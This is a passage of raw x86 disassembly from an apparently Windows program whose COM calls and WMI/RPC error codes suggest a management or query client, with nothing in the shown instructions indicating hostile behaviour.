  40631f:	call   0x4098dc
  406324:	mov    edx,eax
  406326:	lea    ecx,[esi+0x4830]
  40632c:	call   0x40a26c
  406331:	mov    esi,DWORD PTR [edi+0x34]
  406334:	mov    ecx,0xe6
  406339:	call   0x4098dc
  40633e:	mov    ecx,eax
  406340:	call   0x409aea
  406345:	push   0xfe
  40634a:	mov    ecx,0xb4
  40634f:	mov    DWORD PTR [esi+0x4cc4],eax
  406355:	mov    DWORD PTR [esi+0x4cc8],0x10
  40635f:	call   0x4098dc
  406364:	mov    edx,eax
  406366:	lea    ecx,[esi+0x4ac4]
  40636c:	call   0x40a26c
  406371:	mov    esi,DWORD PTR [edi+0x34]
  406374:	mov    ecx,0xe7
  406379:	call   0x4098dc
  40637e:	mov    ecx,eax
  406380:	call   0x409aea
  406385:	push   0xfe
  40638a:	mov    ecx,0xb5
  40638f:	mov    DWORD PTR [esi+0x4f58],eax
  406395:	mov    DWORD PTR [esi+0x4f5c],ebx
  40639b:	call   0x4098dc
  4063a0:	mov    edx,eax
  4063a2:	lea    ecx,[esi+0x4d58]
  4063a8:	call   0x40a26c
  4063ad:	mov    esi,DWORD PTR [edi+0x34]
  4063b0:	mov    ecx,0xe8
  4063b5:	call   0x4098dc
  4063ba:	mov    ecx,eax
  4063bc:	call   0x409aea
  4063c1:	push   0xfe
  4063c6:	mov    ecx,0xb6
  4063cb:	mov    DWORD PTR [esi+0x51ec],eax
  4063d1:	mov    DWORD PTR [esi+0x51f0],ebx
  4063d7:	call   0x4098dc
  4063dc:	mov    edx,eax
  4063de:	lea    ecx,[esi+0x4fec]
  4063e4:	call   0x40a26c
  4063e9:	mov    esi,DWORD PTR [edi+0x34]
  4063ec:	mov    ecx,0xe9
  4063f1:	call   0x4098dc
  4063f6:	mov    ecx,eax
  4063f8:	call   0x409aea
  4063fd:	push   0xfe
  406402:	mov    ecx,0xb7
  406407:	mov    DWORD PTR [esi+0x5480],eax
  40640d:	mov    DWORD PTR [esi+0x5484],ebx
  406413:	call   0x4098dc
  406418:	mov    edx,eax
  40641a:	lea    ecx,[esi+0x5280]
  406420:	call   0x40a26c
  406425:	xor    eax,eax
  406427:	inc    eax
  406428:	call   0x40ea03
  40642d:	ret    
  40642e:	int3   
  40642f:	int3   
  406430:	int3   
  406431:	int3   
  406432:	int3   
  406433:	push   0xc
  406435:	mov    eax,0x40f234
  40643a:	call   0x40eab7
  40643f:	mov    esi,ecx
  406441:	lea    ecx,[ebp-0x14]
  406444:	call   DWORD PTR ds:0x4121c4
  40644a:	and    DWORD PTR [ebp-0x4],0x0
  40644e:	test   esi,esi
  406450:	je     0x406512
  406456:	mov    ecx,esi
  406458:	call   0x40a30b
  40645d:	test   eax,eax
  40645f:	je     0x406512
  406465:	mov    BYTE PTR [ebp-0x4],0x1
  406469:	push   esi
  40646a:	lea    ecx,[ebp-0x14]
  40646d:	call   DWORD PTR ds:0x4121b0
  406473:	push   0x40106c
  406478:	push   DWORD PTR [ebp-0x14]
  40647b:	call   DWORD PTR ds:0x412238
  406481:	pop    ecx
  406482:	pop    ecx
  406483:	test   eax,eax
  406485:	jne    0x40649b
  406487:	or     DWORD PTR [ebp-0x4],0xffffffff
  40648b:	lea    ecx,[ebp-0x14]
  40648e:	call   DWORD PTR ds:0x4121c0
  406494:	xor    eax,eax
  406496:	jmp    0x406522
  40649b:	push   0x401890
  4064a0:	lea    ecx,[ebp-0x14]
  4064a3:	call   DWORD PTR ds:0x4121d0
  4064a9:	or     esi,0xffffffff
  4064ac:	cmp    eax,esi
  4064ae:	je     0x4064b5
  4064b0:	mov    DWORD PTR [ebp-0x4],esi
  4064b3:	jmp    0x40648b
  4064b5:	push   0x5c
  4064b7:	lea    ecx,[ebp-0x14]
  4064ba:	call   DWORD PTR ds:0x4121cc
  4064c0:	cmp    eax,esi
  4064c2:	je     0x4064fd
  4064c4:	inc    eax
  4064c5:	push   eax
  4064c6:	lea    eax,[ebp-0x18]
  4064c9:	push   eax
  4064ca:	lea    ecx,[ebp-0x14]
  4064cd:	call   DWORD PTR ds:0x4121ac
  4064d3:	mov    BYTE PTR [ebp-0x4],0x2
  4064d7:	push   eax
  4064d8:	lea    ecx,[ebp-0x14]
  4064db:	call   DWORD PTR ds:0x4121bc
  4064e1:	mov    BYTE PTR [ebp-0x4],0x1
  4064e5:	lea    ecx,[ebp-0x18]
  4064e8:	call   DWORD PTR ds:0x4121c0
  4064ee:	push   0x5c
  4064f0:	lea    ecx,[ebp-0x14]
  4064f3:	call   DWORD PTR ds:0x4121cc
  4064f9:	cmp    eax,esi
  4064fb:	jne    0x4064b0
  4064fd:	mov    DWORD PTR [ebp-0x4],esi
  406500:	jmp    0x406516
  406502:	mov    ecx,0x80041006
  406507:	call   0x407454
  40650c:	mov    eax,0x406487
  406511:	ret    
  406512:	or     DWORD PTR [ebp-0x4],0xffffffff
  406516:	lea    ecx,[ebp-0x14]
  406519:	call   DWORD PTR ds:0x4121c0
  40651f:	xor    eax,eax
  406521:	inc    eax
  406522:	call   0x40ea03
  406527:	ret    
  406528:	int3   
  406529:	int3   
  40652a:	int3   
  40652b:	int3   
  40652c:	int3   
  40652d:	push   0xc
  40652f:	mov    eax,0x40f266
  406534:	call   0x40eab7
  406539:	mov    esi,edx
  40653b:	mov    edi,ecx
  40653d:	lea    ecx,[ebp-0x14]
  406540:	call   DWORD PTR ds:0x4121c4
  406546:	and    DWORD PTR [ebp-0x4],0x0
  40654a:	test   edi,edi
  40654c:	je     0x40663a
  406552:	mov    ecx,edi
  406554:	call   0x40a30b
  406559:	test   eax,eax
  40655b:	je     0x40663a
  406561:	xor    ebx,ebx
  406563:	inc    ebx
  406564:	mov    BYTE PTR [ebp-0x4],bl
  406567:	and    DWORD PTR [esi],0x0
  40656a:	push   0x0
  40656c:	mov    ecx,edi
  40656e:	call   0x409ba8
  406573:	cmp    eax,ebx
  406575:	jne    0x40658b
  406577:	or     DWORD PTR [ebp-0x4],0xffffffff
  40657b:	lea    ecx,[ebp-0x14]
  40657e:	call   DWORD PTR ds:0x4121c0
  406584:	xor    eax,eax
  406586:	jmp    0x40664e
  40658b:	push   edi
  40658c:	lea    ecx,[ebp-0x14]
  40658f:	call   DWORD PTR ds:0x4121b0
  406595:	mov    ecx,DWORD PTR [ebp-0x14]
  406598:	call   0x40ba1b
  40659d:	cmp    eax,ebx
  40659f:	jne    0x4065da
  4065a1:	push   0x2
  4065a3:	lea    eax,[ebp-0x18]
  4065a6:	push   eax
  4065a7:	lea    ecx,[ebp-0x14]
  4065aa:	call   DWORD PTR ds:0x4121ac
  4065b0:	mov    BYTE PTR [ebp-0x4],0x2
  4065b4:	push   eax
  4065b5:	lea    ecx,[ebp-0x14]
  4065b8:	call   DWORD PTR ds:0x4121bc
  4065be:	mov    BYTE PTR [ebp-0x4],bl
  4065c1:	lea    ecx,[ebp-0x18]
  4065c4:	call   DWORD PTR ds:0x4121c0
  4065ca:	lea    ecx,[ebp-0x14]
  4065cd:	call   DWORD PTR ds:0x4121b8
  4065d3:	mov    eax,DWORD PTR [eax+0x4]
  4065d6:	test   eax,eax
  4065d8:	je     0x406577
  4065da:	push   0x4018ac
  4065df:	lea    ecx,[ebp-0x14]
  4065e2:	call   DWORD PTR ds:0x4121d0
  4065e8:	or     edi,0xffffffff
  4065eb:	cmp    eax,edi
  4065ed:	je     0x4065f4
  4065ef:	mov    DWORD PTR [ebp-0x4],edi
  4065f2:	jmp    0x40657b
  4065f4:	push   0x5c
  4065f6:	lea    ecx,[ebp-0x14]
  4065f9:	call   DWORD PTR ds:0x4121cc
  4065ff:	cmp    eax,edi
  406601:	jne    0x4065ef
  406603:	push   0x4018e8
  406608:	push   DWORD PTR [ebp-0x14]
  40660b:	call   DWORD PTR ds:0x412238
  406611:	pop    ecx
  406612:	pop    ecx
  406613:	test   eax,eax
  406615:	jne    0x40661b
  406617:	mov    DWORD PTR [esi],ebx
  406619:	jmp    0x406625
  40661b:	mov    ecx,DWORD PTR [ebp-0x14]
  40661e:	call   0x40ba60
  406623:	mov    DWORD PTR [esi],eax
  406625:	mov    DWORD PTR [ebp-0x4],edi
  406628:	jmp    0x406643
  40662a:	mov    ecx,0x80041006
  40662f:	call   0x407454
  406634:	mov    eax,0x406577
  406639:	ret    
  40663a:	xor    ebx,ebx
  40663c:	inc    ebx
  40663d:	mov    DWORD PTR [esi],ebx
  40663f:	or     DWORD PTR [ebp-0x4],0xffffffff
  406643:	lea    ecx,[ebp-0x14]
  406646:	call   DWORD PTR ds:0x4121c0
  40664c:	mov    eax,ebx
  40664e:	call   0x40ea03
  406653:	ret    
  406654:	int3   
  406655:	int3   
  406656:	int3   
  406657:	int3   
  406658:	int3   
  406659:	push   0x14
  40665b:	mov    eax,0x40f286
  406660:	call   0x40eaf2
  406665:	mov    edi,ecx
  406667:	mov    DWORD PTR [ebp-0x1c],edi
  40666a:	xor    ebx,ebx
  40666c:	mov    DWORD PTR [ebp-0x18],ebx
  40666f:	mov    DWORD PTR [ebp-0x4],ebx
  406672:	test   edi,edi
  406674:	je     0x4066c5
  406676:	cmp    DWORD PTR [edi],ebx
  406678:	jne    0x4066c5
  40667a:	push   ebx
  40667b:	push   ebx
  40667c:	call   DWORD PTR ds:0x412180
  406682:	test   eax,eax
  406684:	jns    0x40668d
  406686:	mov    ecx,eax
  406688:	call   0x4090c8
  40668d:	push   ebx
  40668e:	push   ebx
  40668f:	push   ebx
  406690:	push   0x3
  406692:	xor    esi,esi
  406694:	inc    esi
  406695:	push   esi
  406696:	push   ebx
  406697:	push   ebx
  406698:	push   0xffffffff
  40669a:	push   ebx
  40669b:	call   DWORD PTR ds:0x41217c
  4066a1:	test   eax,eax
  4066a3:	js     0x406686
  4066a5:	push   edi
  4066a6:	push   0x401c28
  4066ab:	push   esi
  4066ac:	push   ebx
  4066ad:	push   0x401c18
  4066b2:	call   DWORD PTR ds:0x412178
  4066b8:	test   eax,eax
  4066ba:	js     0x406686
  4066bc:	mov    DWORD PTR [ebp-0x18],esi
  4066bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4066c3:	jmp    0x406700
  4066c5:	mov    ecx,0x80041008
  4066ca:	jmp    0x406688
  4066cc:	mov    eax,DWORD PTR [ebp-0x20]
  4066cf:	mov    ecx,DWORD PTR [eax+0x4]
  4066d2:	call   0x407454
  4066d7:	mov    edi,DWORD PTR [ebp-0x1c]
  4066da:	mov    ecx,DWORD PTR [edi]
  4066dc:	test   ecx,ecx
  4066de:	je     0x4066f3
  4066e0:	mov    eax,DWORD PTR [ecx]
  4066e2:	push   ecx
  4066e3:	mov    esi,DWORD PTR [eax+0x8]
  4066e6:	mov    ecx,esi
  4066e8:	call   DWORD PTR ds:0x41228c
  4066ee:	call   esi
  4066f0:	and    DWORD PTR [edi],0x0
  4066f3:	mov    eax,0x4066f9
  4066f8:	ret    
  4066f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4066fd:	mov    esi,DWORD PTR [ebp-0x18]
  406700:	mov    eax,esi
  406702:	call   0x40ea30
  406707:	ret    
  406708:	int3   
  406709:	int3   
  40670a:	int3   
  40670b:	int3   
  40670c:	int3   
  40670d:	push   0x48
  40670f:	mov    eax,0x40f320
  406714:	call   0x40eaf2
  406719:	mov    DWORD PTR [ebp-0x30],edx
  40671c:	mov    DWORD PTR [ebp-0x40],ecx
  40671f:	xor    ebx,ebx
  406721:	mov    DWORD PTR [ebp-0x38],ebx
  406724:	mov    DWORD PTR [ebp-0x34],ebx
  406727:	mov    DWORD PTR [ebp-0x4],ebx
  40672a:	mov    DWORD PTR [ebp-0x1c],ebx
  40672d:	mov    BYTE PTR [ebp-0x4],0x1
  406731:	mov    esi,ebx
  406733:	mov    DWORD PTR [ebp-0x20],esi
  406736:	mov    BYTE PTR [ebp-0x4],0x2
  40673a:	mov    edi,ebx
  40673c:	mov    DWORD PTR [ebp-0x18],edi
  40673f:	mov    BYTE PTR [ebp-0x4],0x3
  406743:	push   ebx
  406744:	call   DWORD PTR ds:0x412014
  40674a:	cmp    DWORD PTR [ebp-0x40],ebx
  40674d:	je     0x406bce
  406753:	mov    eax,DWORD PTR [ebp-0x30]
  406756:	test   eax,eax
  406758:	je     0x406bce
  40675e:	cmp    DWORD PTR [eax],ebx
  406760:	jne    0x406bce
  406766:	cmp    DWORD PTR [ebp+0x1c],ebx
  406769:	je     0x406bce
  40676f:	mov    eax,DWORD PTR [ebp+0x24]
  406772:	test   eax,eax
  406774:	je     0x406778
  406776:	mov    DWORD PTR [eax],ebx
  406778:	mov    eax,DWORD PTR [ebp+0x20]
  40677b:	test   eax,eax
  40677d:	je     0x406781
  40677f:	mov    DWORD PTR [eax],ebx
  406781:	mov    BYTE PTR [ebp-0x4],0x4
  406785:	mov    DWORD PTR [ebp-0x48],ebx
  406788:	lea    edx,[ebp-0x38]
  40678b:	mov    ecx,DWORD PTR [ebp+0x8]
  40678e:	call   0x40652d
  406793:	test   eax,eax
  406795:	jne    0x4067a1
  406797:	mov    ecx,0x800706ba
  40679c:	call   0x4090c8
  4067a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4067a4:	mov    ecx,ebx
  4067a6:	call   0x406433
  4067ab:	test   eax,eax
  4067ad:	jne    0x4067b6
  4067af:	mov    ecx,0x525
  4067b4:	jmp    0x40679c
  4067b6:	push   DWORD PTR [ebp+0x1c]
  4067b9:	lea    ecx,[ebp-0x1c]
  4067bc:	call   0x408bfc
  4067c1:	mov    eax,DWORD PTR [ebp-0x38]
  4067c4:	cmp    DWORD PTR [ebp+0x8],0x0
  4067c8:	je     0x406975
  4067ce:	test   eax,eax
  4067d0:	jne    0x406975
  4067d6:	push   DWORD PTR [ebp+0x8]
  4067d9:	lea    ecx,[ebp-0x34]
  4067dc:	call   0x408bfc
  4067e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4067e4:	call   0x40ba1b
  4067e9:	push   DWORD PTR [ebp+0x1c]
  4067ec:	cmp    eax,0x1
  4067ef:	jne    0x406882
  4067f5:	lea    ecx,[ebp-0x24]
  4067f8:	call   0x40594b
  4067fd:	mov    BYTE PTR [ebp-0x4],0x5
  406801:	push   0x40106c
  406806:	lea    ecx,[ebp-0x28]
  406809:	call   0x40594b
  40680e:	mov    BYTE PTR [ebp-0x4],0x6
  406812:	lea    eax,[ebp-0x28]
  406815:	push   eax
  406816:	lea    eax,[ebp-0x4c]
  406819:	push   eax
  40681a:	lea    ecx,[ebp-0x34]
  40681d:	call   0x408bb6
  406822:	mov    BYTE PTR [ebp-0x4],0x7
  406826:	lea    ecx,[ebp-0x24]
  406829:	push   ecx
  40682a:	lea    ecx,[ebp-0x44]
  40682d:	push   ecx
  40682e:	mov    ecx,eax
  406830:	call   0x408bb6
  406835:	mov    ebx,eax
  406837:	mov    BYTE PTR [ebp-0x4],0x8
  40683b:	mov    ecx,DWORD PTR [ebx]
  40683d:	test   ecx,ecx
  40683f:	je     0x406845
  406841:	lock inc DWORD PTR [ecx+0x8]
  406845:	lea    ecx,[ebp-0x1c]
  406848:	call   0x4058ac
  40684d:	mov    ebx,DWORD PTR [ebx]
  40684f:	mov    DWORD PTR [ebp-0x1c],ebx
  406852:	mov    BYTE PTR [ebp-0x4],0x7
  406856:	lea    ecx,[ebp-0x44]
  406859:	call   0x4058ac
  40685e:	mov    BYTE PTR [ebp-0x4],0x6
  406862:	lea    ecx,[ebp-0x4c]
  406865:	call   0x4058ac
  40686a:	mov    BYTE PTR [ebp-0x4],0x5
  40686e:	lea    ecx,[ebp-0x28]
  406871:	call   0x4058ac
  406876:	mov    BYTE PTR [ebp-0x4],0x4
  40687a:	lea    ecx,[ebp-0x24]
  40687d:	jmp    0x406925
  406882:	lea    ecx,[ebp-0x28]
  406885:	call   0x40594b
  40688a:	mov    BYTE PTR [ebp-0x4],0x9
  40688e:	push   0x40106c
  406893:	lea    ecx,[ebp-0x24]
  406896:	call   0x40594b
  40689b:	mov    BYTE PTR [ebp-0x4],0xa
  40689f:	lea    eax,[ebp-0x34]
  4068a2:	push   eax
  4068a3:	lea    ecx,[ebp-0x3c]
  4068a6:	call   0x408a39
  4068ab:	mov    BYTE PTR [ebp-0x4],0xb
  4068af:	lea    ecx,[ebp-0x24]
  4068b2:	push   ecx
  4068b3:	lea    ecx,[ebp-0x44]
  4068b6:	push   ecx
  4068b7:	mov    ecx,eax
  4068b9:	call   0x408bb6
  4068be:	mov    BYTE PTR [ebp-0x4],0xc
  4068c2:	lea    ecx,[ebp-0x28]
  4068c5:	push   ecx
  4068c6:	lea    ecx,[ebp-0x4c]
  4068c9:	push   ecx
  4068ca:	mov    ecx,eax
  4068cc:	call   0x408bb6
  4068d1:	mov    ebx,eax
  4068d3:	mov    BYTE PTR [ebp-0x4],0xd
  4068d7:	mov    ecx,DWORD PTR [ebx]
  4068d9:	test   ecx,ecx
  4068db:	je     0x4068e1
  4068dd:	lock inc DWORD PTR [ecx+0x8]
  4068e1:	lea    ecx,[ebp-0x1c]
  4068e4:	call   0x4058ac
  4068e9:	mov    ebx,DWORD PTR [ebx]
  4068eb:	mov    DWORD PTR [ebp-0x1c],ebx
  4068ee:	mov    BYTE PTR [ebp-0x4],0xc
  4068f2:	lea    ecx,[ebp-0x4c]
  4068f5:	call   0x4058ac
  4068fa:	mov    BYTE PTR [ebp-0x4],0xb
  4068fe:	lea    ecx,[ebp-0x44]
  406901:	call   0x4058ac
  406906:	mov    BYTE PTR [ebp-0x4],0xa
  40690a:	lea    ecx,[ebp-0x3c]
  40690d:	call   0x4058ac
  406912:	mov    BYTE PTR [ebp-0x4],0x9
  406916:	lea    ecx,[ebp-0x24]
  406919:	call   0x4058ac
  40691e:	mov    BYTE PTR [ebp-0x4],0x4
  406922:	lea    ecx,[ebp-0x28]
  406925:	call   0x4058ac
  40692a:	cmp    DWORD PTR [ebp+0xc],0x0
  40692e:	je     0x4069a7
  406930:	mov    ecx,DWORD PTR [ebp+0xc]
  406933:	call   0x40a30b
  406938:	test   eax,eax
  40693a:	je     0x4069a7
  40693c:	push   DWORD PTR [ebp+0xc]
  40693f:	lea    ecx,[ebp-0x20]
  406942:	call   0x408bfc
  406947:	push   DWORD PTR [ebp+0x10]
  40694a:	lea    ecx,[ebp-0x18]
  40694d:	call   0x408bfc
  406952:	cmp    DWORD PTR [ebp+0x18],0x1
  406956:	jne    0x40696d
  406958:	lea    ecx,[ebp-0x18]
  40695b:	call   0x408a80
  406960:	test   eax,eax
  406962:	jne    0x40696d
  406964:	push   eax
  406965:	lea    ecx,[ebp-0x18]
  406968:	call   0x408bfc
  40696d:	mov    esi,DWORD PTR [ebp-0x20]
  406970:	mov    edi,DWORD PTR [ebp-0x18]
  406973:	jmp    0x406999
  406975:	cmp    eax,0x1
  406978:	jne    0x4069a4
  40697a:	test   ebx,ebx
  40697c:	je     0x4069a4
  40697e:	mov    ecx,ebx
  406980:	call   0x40a30b
  406985:	test   eax,eax
  406987:	je     0x4069a4
  406989:	mov    eax,DWORD PTR [ebp+0x20]
  40698c:	test   eax,eax
  40698e:	je     0x4069a4
  406990:	mov    DWORD PTR [eax],0x80041064
  406996:	mov    ebx,DWORD PTR [ebp-0x1c]
  406999:	test   edi,edi
  40699b:	je     0x4069a7
  40699d:	mov    eax,DWORD PTR [edi]
  40699f:	mov    DWORD PTR [ebp-0x24],eax
  4069a2:	jmp    0x4069ab
  4069a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4069a7:	and    DWORD PTR [ebp-0x24],0x0
  4069ab:	test   esi,esi
  4069ad:	je     0x4069b6
  4069af:	mov    eax,DWORD PTR [esi]
  4069b1:	mov    DWORD PTR [ebp-0x28],eax
  4069b4:	jmp    0x4069ba
  4069b6:	and    DWORD PTR [ebp-0x28],0x0
  4069ba:	test   ebx,ebx
  4069bc:	je     0x4069c2
  4069be:	mov    ecx,DWORD PTR [ebx]
  4069c0:	jmp    0x4069c4
  4069c2:	xor    ecx,ecx
  4069c4:	mov    edx,DWORD PTR [ebp-0x40]
  4069c7:	mov    eax,DWORD PTR [edx]
  4069c9:	mov    DWORD PTR [ebp-0x3c],eax
  4069cc:	push   DWORD PTR [ebp-0x30]
  4069cf:	push   0x0
  4069d1:	push   0x0
  4069d3:	push   0x0
  4069d5:	push   0x0
  4069d7:	push   DWORD PTR [ebp-0x24]
  4069da:	push   DWORD PTR [ebp-0x28]
  4069dd:	push   ecx
  4069de:	push   edx
  4069df:	mov    ecx,DWORD PTR [eax+0xc]
  4069e2:	call   DWORD PTR ds:0x41228c
  4069e8:	mov    eax,DWORD PTR [ebp-0x3c]
  4069eb:	call   DWORD PTR [eax+0xc]
  4069ee:	mov    DWORD PTR [ebp-0x2c],eax
  4069f1:	test   eax,eax
  4069f3:	jns    0x406b05
  4069f9:	cmp    eax,0x80070005
  4069fe:	jne    0x406a95
  406a04:	cmp    DWORD PTR [ebp+0x18],0x1
  406a08:	jne    0x406b10
  406a0e:	lea    ecx,[ebp-0x20]
  406a11:	call   0x408a80
  406a16:	test   eax,eax
  406a18:	je     0x406b0d
  406a1e:	lea    ecx,[ebp-0x18]
  406a21:	call   0x408a80
  406a26:	test   eax,eax
  406a28:	jne    0x406b0d
  406a2e:	push   0x40188c
  406a33:	lea    ecx,[ebp-0x3c]
  406a36:	call   0x40594b
  406a3b:	mov    BYTE PTR [ebp-0x4],0xe
  406a3f:	mov    eax,DWORD PTR [eax]
  406a41:	test   eax,eax
  406a43:	je     0x406a49
  406a45:	mov    edx,DWORD PTR [eax]
  406a47:	jmp    0x406a4b
  406a49:	xor    edx,edx
  406a4b:	test   esi,esi
  406a4d:	je     0x406a53
  406a4f:	mov    ecx,DWORD PTR [esi]
  406a51:	jmp    0x406a55
  406a53:	xor    ecx,ecx
  406a55:	test   ebx,ebx
  406a57:	je     0x406a5f
  406a59:	mov    eax,DWORD PTR [ebx]
  406a5b:	xor    ebx,ebx
  406a5d:	jmp    0x406a63
  406a5f:	xor    ebx,ebx
  406a61:	mov    eax,ebx
  406a63:	mov    edi,DWORD PTR [ebp-0x40]
  406a66:	mov    edi,DWORD PTR [edi]
  406a68:	push   DWORD PTR [ebp-0x30]
  406a6b:	push   ebx
  406a6c:	push   ebx
  406a6d:	push   ebx
  406a6e:	push   ebx
  406a6f:	push   edx
  406a70:	push   ecx
  406a71:	push   eax
  406a72:	push   DWORD PTR [ebp-0x40]
  406a75:	mov    ecx,DWORD PTR [edi+0xc]
  406a78:	call   DWORD PTR ds:0x41228c
  406a7e:	call   DWORD PTR [edi+0xc]
  406a81:	mov    DWORD PTR [ebp-0x2c],eax
  406a84:	mov    BYTE PTR [ebp-0x4],0x4
  406a88:	lea    ecx,[ebp-0x3c]
  406a8b:	call   0x4058ac
  406a90:	mov    eax,DWORD PTR [ebp-0x2c]
  406a93:	jmp    0x406af1
  406a95:	cmp    eax,0x80041064
  406a9a:	jne    0x406af1
  406a9c:	mov    DWORD PTR [ebp-0x38],0x1
  406aa3:	xor    ebx,ebx
  406aa5:	push   ebx
  406aa6:	lea    ecx,[ebp-0x20]
  406aa9:	call   0x408bfc
  406aae:	push   ebx
  406aaf:	lea    ecx,[ebp-0x18]
  406ab2:	call   0x408bfc
  406ab7:	push   DWORD PTR [ebp+0x1c]
  406aba:	lea    ecx,[ebp-0x1c]
  406abd:	call   0x408bfc
  406ac2:	mov    eax,DWORD PTR [ebp-0x1c]
  406ac5:	test   eax,eax
  406ac7:	je     0x406acd
  406ac9:	mov    eax,DWORD PTR [eax]
  406acb:	jmp    0x406acf
  406acd:	mov    eax,ebx
  406acf:	mov    ecx,DWORD PTR [ebp-0x40]
  406ad2:	mov    esi,DWORD PTR [ecx]
  406ad4:	push   DWORD PTR [ebp-0x30]
  406ad7:	push   ebx
  406ad8:	push   ebx
  406ad9:	push   ebx
  406ada:	push   ebx
  406adb:	push   ebx
  406adc:	push   ebx
  406add:	push   eax
  406ade:	push   ecx
  406adf:	mov    ecx,DWORD PTR [esi+0xc]
  406ae2:	call   DWORD PTR ds:0x41228c
  406ae8:	call   DWORD PTR [esi+0xc]
  406aeb:	mov    DWORD PTR [ebp-0x2c],eax
  406aee:	mov    esi,DWORD PTR [ebp-0x20]
  406af1:	test   eax,eax
  406af3:	js     0x406b10
  406af5:	push   0x40188c
  406afa:	lea    ecx,[ebp-0x18]
  406afd:	call   0x408bfc
  406b02:	mov    edi,DWORD PTR [ebp-0x18]
  406b05:	test   edi,edi
  406b07:	je     0x406b17
  406b09:	mov    eax,DWORD PTR [edi]
  406b0b:	jmp    0x406b19
  406b0d:	mov    eax,DWORD PTR [ebp-0x2c]
  406b10:	mov    ecx,eax
  406b12:	jmp    0x40679c
  406b17:	xor    eax,eax
  406b19:	test   esi,esi
  406b1b:	je     0x406b21
  406b1d:	mov    edx,DWORD PTR [esi]
  406b1f:	jmp    0x406b23
  406b21:	xor    edx,edx
  406b23:	push   DWORD PTR [ebp+0x14]
  406b26:	push   eax
  406b27:	mov    eax,DWORD PTR [ebp-0x30]
  406b2a:	mov    ecx,DWORD PTR [eax]
  406b2c:	call   0x406ee0
  406b31:	mov    DWORD PTR [ebp-0x2c],eax
  406b34:	test   eax,eax
  406b36:	js     0x406b10
  406b38:	mov    ecx,DWORD PTR [ebp+0x24]
  406b3b:	test   ecx,ecx
  406b3d:	je     0x406b44
  406b3f:	mov    eax,DWORD PTR [ebp-0x38]
  406b42:	mov    DWORD PTR [ecx],eax
  406b44:	xor    esi,esi
  406b46:	inc    esi
  406b47:	mov    DWORD PTR [ebp-0x48],esi
  406b4a:	mov    DWORD PTR [ebp-0x4],0x3
  406b51:	jmp    0x406b9a
  406b53:	mov    esi,DWORD PTR [ebp-0x50]
  406b56:	mov    ecx,DWORD PTR [esi+0x4]
  406b59:	call   0x407454
  406b5e:	mov    ecx,DWORD PTR [ebp+0x20]
  406b61:	test   ecx,ecx
  406b63:	je     0x406b6a
  406b65:	mov    eax,DWORD PTR [esi+0x4]
  406b68:	mov    DWORD PTR [ecx],eax
  406b6a:	mov    edi,DWORD PTR [ebp-0x30]
  406b6d:	mov    ecx,DWORD PTR [edi]
  406b6f:	test   ecx,ecx
  406b71:	je     0x406b86
  406b73:	mov    eax,DWORD PTR [ecx]
  406b75:	push   ecx
  406b76:	mov    esi,DWORD PTR [eax+0x8]
  406b79:	mov    ecx,esi
  406b7b:	call   DWORD PTR ds:0x41228c
  406b81:	call   esi
  406b83:	and    DWORD PTR [edi],0x0
  406b86:	and    DWORD PTR [ebp-0x48],0x0
  406b8a:	mov    eax,0x406b90
  406b8f:	ret    
  406b90:	mov    DWORD PTR [ebp-0x4],0x3
  406b97:	mov    esi,DWORD PTR [ebp-0x48]
  406b9a:	mov    BYTE PTR [ebp-0x4],0x2
  406b9e:	lea    ecx,[ebp-0x18]
  406ba1:	call   0x4058ac
  406ba6:	mov    BYTE PTR [ebp-0x4],0x1
  406baa:	lea    ecx,[ebp-0x20]
  406bad:	call   0x4058ac
  406bb2:	mov    BYTE PTR [ebp-0x4],0x0
  406bb6:	lea    ecx,[ebp-0x1c]
  406bb9:	call   0x4058ac
  406bbe:	or     DWORD PTR [ebp-0x4],0xffffffff
  406bc2:	lea    ecx,[ebp-0x34]
  406bc5:	call   0x4058ac
  406bca:	mov    eax,esi
  406bcc:	jmp    0x406c0c
  406bce:	mov    eax,DWORD PTR [ebp+0x20]
  406bd1:	test   eax,eax
  406bd3:	je     0x406bdb
  406bd5:	mov    DWORD PTR [eax],0x80041008
  406bdb:	mov    BYTE PTR [ebp-0x4],0x2
  406bdf:	lea    ecx,[ebp-0x18]
  406be2:	call   0x4058ac
  406be7:	mov    BYTE PTR [ebp-0x4],0x1
  406beb:	lea    ecx,[ebp-0x20]
  406bee:	call   0x4058ac
  406bf3:	mov    BYTE PTR [ebp-0x4],bl
  406bf6:	lea    ecx,[ebp-0x1c]
  406bf9:	call   0x4058ac
  406bfe:	or     DWORD PTR [ebp-0x4],0xffffffff
  406c02:	lea    ecx,[ebp-0x34]
  406c05:	call   0x4058ac
  406c0a:	xor    eax,eax
  406c0c:	call   0x40ea30
  406c11:	ret    0x24
  406c14:	int3   
  406c15:	int3   
  406c16:	int3   
  406c17:	int3   
  406c18:	int3   
  406c19:	push   0x20
  406c1b:	mov    eax,0x40f353
  406c20:	call   0x40eab7
  406c25:	mov    esi,edx
  406c27:	mov    DWORD PTR [ebp-0x28],esi
  406c2a:	mov    DWORD PTR [ebp-0x20],ecx
  406c2d:	xor    ebx,ebx
  406c2f:	mov    DWORD PTR [ebp-0x1c],ebx
  406c32:	mov    DWORD PTR [ebp-0x24],ebx
  406c35:	lea    ecx,[ebp-0x14]
  406c38:	call   DWORD PTR ds:0x4121c4
  406c3e:	mov    DWORD PTR [ebp-0x4],ebx
  406c41:	push   ebx
  406c42:	call   DWORD PTR ds:0x412014
  406c48:	mov    BYTE PTR [ebp-0x4],0x1
  406c4c:	mov    ebx,DWORD PTR [ebp+0x10]
  406c4f:	cmp    DWORD PTR [ebp+0x18],0x1
  406c53:	jne    0x406c6e
  406c55:	push   0x4018f4
  406c5a:	mov    ecx,ebx
  406c5c:	call   DWORD PTR ds:0x4121a8
  406c62:	test   eax,eax
  406c64:	jne    0x406c6e
  406c66:	mov    edi,DWORD PTR [ebp+0xc]
  406c69:	jmp    0x406d28
  406c6e:	mov    edi,DWORD PTR [ebp+0xc]
  406c71:	mov    ecx,edi
  406c73:	call   DWORD PTR ds:0x4121b8
  406c79:	mov    eax,DWORD PTR [eax+0x4]
  406c7c:	test   eax,eax
  406c7e:	jne    0x406c97
  406c80:	push   ecx
  406c81:	push   DWORD PTR [ebp+0x20]
  406c84:	lea    eax,[ebp-0x1c]
  406c87:	push   eax
  406c88:	push   0x401078
  406c8d:	xor    eax,eax
  406c8f:	push   eax
